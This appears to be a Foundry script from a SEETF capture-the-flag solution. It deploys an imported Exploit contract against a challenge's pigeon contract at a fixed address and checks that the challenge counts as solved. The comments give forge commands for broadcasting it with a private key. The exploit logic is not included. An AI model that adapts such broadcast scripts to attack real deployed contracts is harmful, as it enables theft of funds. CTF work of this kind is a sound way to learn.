// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "./challenge/Setup.sol";
import "./Exploit.sol";

// forge script src/SEETF/OperationFeatheredFortuneFiasco/Exploit.s.sol:ExploitScript -vvvvv --private-key $PRIVATE_KEY --fork-url $RPC_URL
// forge script src/SEETF/OperationFeatheredFortuneFiasco/Exploit.s.sol:ExploitScript -vvvvv --private-key $PRIVATE_KEY --fork-url $RPC_URL --broadcast

contract ExploitScript is Script {
    function run() public {
        address setUpContractAddress = 0xd6138fCa0365a270502D51a42a91ddc6A664C6D7;
        Setup setup = Setup(payable(setUpContractAddress));

        vm.startBroadcast();
        new Exploit().exploit(address(setup.pigeon()));
        vm.stopBroadcast();

        assert(setup.isSolved());
    }
}
